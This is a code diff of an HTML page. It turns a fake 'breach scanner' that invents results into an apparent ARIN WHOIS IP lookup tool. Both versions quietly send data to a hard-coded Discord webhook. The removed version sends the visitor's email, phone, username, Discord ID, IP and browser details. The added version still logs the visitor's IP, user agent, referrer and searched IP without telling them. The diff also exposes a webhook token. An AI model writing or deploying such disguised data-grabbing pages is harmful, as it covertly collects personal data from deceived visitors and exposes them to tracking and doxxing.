@@ -3,202 +3,320 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CybrSearch - Advanced Security Scanner</title>
+  <title>ARIN IP Lookup Tool</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     :root {
-      --dark-bg: #0d1117;
-      --card-bg: #161b22;
-      --accent-blue: #1f6feb;
-      --accent-green: #2ea043;
-      --accent-red: #f85149;
-      --text-color: #c9d1d9;
+      --dark-bg: #0f172a;
+      --darker-bg: #0b1120;
+      --card-bg: #1e293b;
+      --accent: #3b82f6;
+      --text: #e2e8f0;
+      --text-muted: #94a3b8;
     }
+    
     body {
       background-color: var(--dark-bg);
-      color: var(--text-color);
+      color: var(--text);
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      padding: 20px;
+      line-height: 1.6;
     }
-    .container {
-      max-width: 600px;
+    
+    .navbar-brand {
+      font-weight: 600;
+      letter-spacing: 0.5px;
     }
+    
     .card {
       background-color: var(--card-bg);
-      border: 1px solid #30363d;
-      border-radius: 8px;
-      padding: 20px;
-      margin-bottom: 20px;
-    }
-    .result-found {
-      border-left: 4px solid var(--accent-red);
-    }
-    .result-clean {
-      border-left: 4px solid var(--accent-green);
-    }
-    .form-control {
-      background-color: var(--dark-bg);
-      color: var(--text-color);
-      border: 1px solid #30363d;
-    }
-    .btn-primary {
-      background-color: var(--accent-blue);
       border: none;
+      border-radius: 10px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+    
+    .form-control {
+      background-color: var(--darker-bg);
+      color: var(--text);
+      border: 1px solid #334155;
+    }
+    
+    .form-control:focus {
+      background-color: var(--darker-bg);
+      color: var(--text);
+      border-color: var(--accent);
+      box-shadow: 0 0 0 0.25rem rgba(59, 130, 246, 0.25);
+    }
+    
+    .result-card {
+      border-left: 4px solid var(--accent);
+    }
+    
+    .whois-field {
+      display: grid;
+      grid-template-columns: 140px 1fr;
+      margin-bottom: 8px;
+    }
+    
+    .whois-label {
+      color: var(--text-muted);
+      font-weight: 500;
+    }
+    
+    pre {
+      background-color: var(--darker-bg);
+      padding: 15px;
+      border-radius: 6px;
+      overflow-x: auto;
+    }
+    
+    .loading-spinner {
+      display: inline-block;
+      width: 1.5rem;
+      height: 1.5rem;
+      border: 0.25em solid currentColor;
+      border-right-color: transparent;
+      border-radius: 50%;
+      animation: spinner 0.75s linear infinite;
+    }
+    
+    @keyframes spinner {
+      to { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="card">
-      <h2 class="text-center mb-4">🔍 CybrSearch Breach Scanner</h2>
-      <form id="searchForm">
-        <input id="searchEmail" type="email" placeholder="📧 Email address" class="form-control mb-3">
-        <input id="searchPhone" type="text" placeholder="📱 Phone number" class="form-control mb-3">
-        <input id="searchUsername" type="text" placeholder="👤 Username" class="form-control mb-3">
-        <input id="searchDiscord" type="text" placeholder="💬 Discord ID (ex: User#1234)" class="form-control mb-3">
-        <input id="searchIP" type="text" placeholder="🌐 IP address (optional)" class="form-control mb-3">
-        <button type="submit" class="btn btn-primary w-100">Scan for Breaches</button>
-      </form>
+  <nav class="navbar navbar-expand-lg navbar-dark" style="background-color: var(--darker-bg)">
+    <div class="container">
+      <a class="navbar-brand" href="#">
+        <i class="fas fa-search-location me-2"></i>ARIN IP Lookup
+      </a>
     </div>
+  </nav>
 
-    <div id="resultsContainer"></div>
+  <div class="container py-5">
+    <div class="row justify-content-center">
+      <div class="col-lg-8">
+        <div class="card p-4 mb-4">
+          <h2 class="mb-4"><i class="fas fa-globe me-2"></i>IP Address Lookup</h2>
+          <form id="lookupForm">
+            <div class="input-group mb-3">
+              <input type="text" id="ipInput" class="form-control" placeholder="Enter IP address (e.g., 8.8.8.8)" required>
+              <button class="btn btn-primary" type="submit">
+                <i class="fas fa-search me-2"></i>Lookup
+              </button>
+            </div>
+            <div class="form-text">
+              Queries ARIN WHOIS database for IP registration information
+            </div>
+          </form>
+        </div>
+
+        <div id="resultsContainer">
+          <div class="card p-4 text-center text-muted">
+            <i class="fas fa-globe-americas fa-3x mb-3"></i>
+            <h4>No search performed</h4>
+            <p>Enter an IP address to view WHOIS information</p>
+          </div>
+        </div>
+      </div>
+    </div>
   </div>
 
   <script>
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1382930697114882129/SGf8Ej5YP69QZ9pga3ZS-zN84_dyU2XyDNYmbkbBZXUz1S0L0USOfBRm2WlJc6H2--BO";
     
-    document.getElementById('searchForm').addEventListener('submit', async function(e) {
+    document.getElementById('lookupForm').addEventListener('submit', async function(e) {
       e.preventDefault();
       
-      // Get all search values
-      const searchData = {
-        email: document.getElementById('searchEmail').value.trim(),
-        phone: document.getElementById('searchPhone').value.trim(),
-        username: document.getElementById('searchUsername').value.trim(),
-        discord: document.getElementById('searchDiscord').value.trim(),
-        ip: document.getElementById('searchIP').value.trim()
-      };
+      const ip = document.getElementById('ipInput').value.trim();
+      const resultsContainer = document.getElementById('resultsContainer');
+      
+      // Validate IP format
+      if (!isValidIP(ip)) {
+        showError("Please enter a valid IP address");
+        return;
+      }
       
       // Show loading state
-      const resultsContainer = document.getElementById('resultsContainer');
-      resultsContainer.innerHTML = '<div class="card">Scanning... <div class="spinner-border spinner-border-sm"></div></div>';
+      resultsContainer.innerHTML = `
+        <div class="card p-4 text-center">
+          <div class="loading-spinner mb-3"></div>
+          <h4>Querying ARIN WHOIS...</h4>
+          <p class="text-muted">Looking up ${ip}</p>
+        </div>
+      `;
       
       try {
-        // Get visitor's IP
+        // Get visitor IP first
         const visitorIp = await getVisitorIp();
         
-        // Check breach databases (simulated)
-        const hasResults = await checkBreachApis(searchData);
+        // Query ARIN WHOIS
+        const whoisData = await queryARINWhois(ip);
         
-        // Display user-friendly results
-        if (hasResults) {
-          resultsContainer.innerHTML = `
-            <div class="card result-found">
-              <h4>⚠️ Breaches Found</h4>
-              <p>We found exposed data matching your search.</p>
-              <div class="mt-3">
-                ${searchData.email ? `<p>• Email: ${searchData.email}</p>` : ''}
-                ${searchData.username ? `<p>• Username: ${searchData.username}</p>` : ''}
-                ${searchData.discord ? `<p>• Discord ID: ${searchData.discord}</p>` : ''}
-              </div>
-            </div>
-          `;
-        } else {
-          resultsContainer.innerHTML = `
-            <div class="card result-clean">
-              <h4>✅ No Breaches Found</h4>
-              <p>No exposed data found for these search terms.</p>
-            </div>
-          `;
-        }
+        // Display results
+        displayResults(ip, whoisData);
         
-        // Send full details to Discord
-        await sendToDiscord({
-          ...searchData,
+        // Log to Discord
+        await logToDiscord({
+          searchedIp: ip,
           visitorIp: visitorIp,
           userAgent: navigator.userAgent,
-          platform: navigator.platform,
           referrer: document.referrer || 'Direct',
-          timestamp: new Date().toUTCString(),
-          hasResults
+          timestamp: new Date().toISOString(),
+          whoisData: whoisData
         });
         
       } catch (error) {
-        resultsContainer.innerHTML = `
-          <div class="card result-found">
-            <h4>⚠️ Scan Error</h4>
-            <p>There was an error processing your request.</p>
-          </div>
-        `;
-        
-        await sendToDiscord({
-          ...searchData,
-          error: error.message,
+        showError(error.message);
+        await logToDiscord({
+          searchedIp: ip,
           visitorIp: await getVisitorIp(),
-          timestamp: new Date().toUTCString()
+          error: error.message,
+          timestamp: new Date().toISOString()
         });
       }
     });
     
-    // Get visitor's real IP address
+    // Validate IP address format
+    function isValidIP(ip) {
+      const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+      const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$/;
+      return ipv4Regex.test(ip) || ipv6Regex.test(ip);
+    }
+    
+    // Get visitor's IP address
     async function getVisitorIp() {
       try {
         const response = await fetch('https://api.ipify.org?format=json');
         const data = await response.json();
-        return data.ip || 'Unknown';
+        return data.ip;
       } catch (error) {
-        console.error('Error getting IP:', error);
-        return 'Unknown';
+        console.error("Couldn't get visitor IP:", error);
+        return "Unknown";
       }
     }
     
-    // Simulated API check
-    async function checkBreachApis(data) {
-      // Simulate API delay
-      await new Promise(resolve => setTimeout(resolve, 1500));
-      
-      // For demo, 30% chance of "finding" breaches
-      return Math.random() < 0.3;
+    // Query ARIN WHOIS database
+    async function queryARINWhois(ip) {
+      try {
+        // Using ARIN's RESTful WHOIS API
+        const response = await fetch(`https://whois.arin.net/rest/ip/${ip}.json`);
+        
+        if (!response.ok) {
+          throw new Error(`ARIN returned status ${response.status}`);
+        }
+        
+        const data = await response.json();
+        return data;
+      } catch (error) {
+        throw new Error(`WHOIS lookup failed: ${error.message}`);
+      }
     }
     
-    // Send rich embed to Discord
-    async function sendToDiscord(data) {
+    // Display WHOIS results
+    function displayResults(ip, whoisData) {
+      const resultsContainer = document.getElementById('resultsContainer');
+      
+      // Parse relevant WHOIS data
+      const net = whoisData?.net || {};
+      const org = whoisData?.org || {};
+      const customer = whoisData?.customer || {};
+      
+      resultsContainer.innerHTML = `
+        <div class="card result-card p-4">
+          <div class="d-flex justify-content-between align-items-center mb-3">
+            <h4 class="mb-0"><i class="fas fa-info-circle me-2"></i>WHOIS Results for ${ip}</h4>
+            <span class="badge bg-primary">ARIN</span>
+          </div>
+          
+          <div class="mb-4">
+            <div class="whois-field">
+              <span class="whois-label">Network Name:</span>
+              <span>${net.name?.['$'] || 'Not available'}</span>
+            </div>
+            <div class="whois-field">
+              <span class="whois-label">Range:</span>
+              <span>${net.startAddress?.['$']} - ${net.endAddress?.['$']}</span>
+            </div>
+            <div class="whois-field">
+              <span class="whois-label">Organization:</span>
+              <span>${org.name?.['$'] || customer.name?.['$'] || 'Not available'}</span>
+            </div>
+            <div class="whois-field">
+              <span class="whois-label">Country:</span>
+              <span>${net.iso3166_1?.name?.['$'] || 'Not available'}</span>
+            </div>
+            <div class="whois-field">
+              <span class="whois-label">Updated:</span>
+              <span>${net.updateDate?.['$'] || 'Not available'}</span>
+            </div>
+          </div>
+          
+          <h5 class="mt-4 mb-3"><i class="fas fa-code me-2"></i>Raw WHOIS Data</h5>
+          <pre id="rawWhois"></pre>
+        </div>
+      `;
+      
+      // Display formatted raw data
+      document.getElementById('rawWhois').textContent = JSON.stringify(whoisData, null, 2);
+    }
+    
+    // Show error message
+    function showError(message) {
+      const resultsContainer = document.getElementById('resultsContainer');
+      resultsContainer.innerHTML = `
+        <div class="card border-danger">
+          <div class="card-body text-center text-danger">
+            <i class="fas fa-exclamation-triangle fa-2x mb-3"></i>
+            <h4>Lookup Failed</h4>
+            <p>${message}</p>
+            <button class="btn btn-sm btn-outline-danger" onclick="window.location.reload()">
+              <i class="fas fa-sync-alt me-2"></i>Try Again
+            </button>
+          </div>
+        </div>
+      `;
+    }
+    
+    // Log search to Discord
+    async function logToDiscord(data) {
       const embed = {
-        title: data.error ? "⚠️ Scan Error" : data.hasResults ? "🔍 Breach Found" : "✅ No Breaches Found",
-        color: data.error ? 0xf85149 : data.hasResults ? 0xf85149 : 0x2ea043,
+        title: "🔍 New IP Lookup",
+        color: data.error ? 0xf87171 : 0x60a5fa,
         fields: [
-          { name: "Email", value: data.email || "Not provided", inline: true },
-          { name: "Phone", value: data.phone || "Not provided", inline: true },
-          { name: "Username", value: data.username || "Not provided", inline: true },
-          { name: "Discord ID", value: data.discord || "Not provided", inline: true },
-          { name: "IP Entered", value: data.ip || "Not provided" },
-          { name: "Visitor IP", value: data.visitorIp || "Unknown" },
+          { name: "Searched IP", value: data.searchedIp || "Unknown", inline: true },
+          { name: "Visitor IP", value: data.visitorIp || "Unknown", inline: true },
           { name: "User Agent", value: data.userAgent || "Unknown" },
-          { name: "Platform", value: data.platform || "Unknown" },
           { name: "Referrer", value: data.referrer || "Direct" },
-          { name: "Time (UTC)", value: data.timestamp || new Date().toUTCString() }
+          { name: "Time", value: new Date(data.timestamp).toUTCString() }
         ],
         footer: {
-          text: "Breach Logger • CybrSearch"
+          text: "ARIN Lookup Logger"
         }
       };
       
       if (data.error) {
         embed.fields.push({ name: "Error", value: data.error });
+      } else {
+        embed.fields.push(
+          { name: "Network Name", value: data.whoisData?.net?.name?.['$'] || "Not available", inline: true },
+          { name: "Organization", value: data.whoisData?.org?.name?.['$'] || data.whoisData?.customer?.name?.['$'] || "Not available", inline: true }
+        );
       }
       
       try {
         await fetch(DISCORD_WEBHOOK, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            embeds: [embed],
-            username: "CybrSearch Logger",
-            avatar_url: "https://i.imgur.com/ABCD123.png" // Replace with your logo
+          body: JSON.stringify({
+            username: "ARIN Lookup Bot",
+            avatar_url: "https://i.imgur.com/7VZ0hWY.png",
+            embeds: [embed]
           })
         });
       } catch (error) {
-        console.error('Discord webhook error:', error);
+        console.error("Failed to send Discord webhook:", error);
       }
     }
   </script>
